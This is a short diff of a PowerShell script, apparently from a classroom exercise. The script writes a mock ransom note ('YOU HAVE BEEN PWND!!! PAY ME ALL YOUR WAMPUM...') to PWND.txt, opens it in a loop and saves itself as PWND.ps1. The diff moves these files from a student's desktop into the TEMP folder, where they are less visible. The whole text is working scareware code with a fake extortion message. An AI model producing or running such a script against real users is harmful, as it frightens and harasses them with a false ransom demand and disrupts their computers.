@@ -1,7 +1,6 @@
 $code = {
   $val=0;
-  while($val -ne 6) {
-  Set-Location C:\Users\student\Desktop;
+  while($val -ne 6) {Set-Location $env:TEMP;
   New-Item .\PWND.txt -ErrorAction SilentlyContinue;
   Set-Content .\PWND.txt 'YOU HAVE BEEN PWND!!!  PAY ME ALL YOUR WAMPUM AND I WILL SET YOU FREE!!!';
   .\PWND.txt;
@@ -12,4 +11,7 @@ $code = {
   }
 }
 
+Set-Location $env:TEMP
 Set-Content .\PWND.ps1 -Value $code
+
+
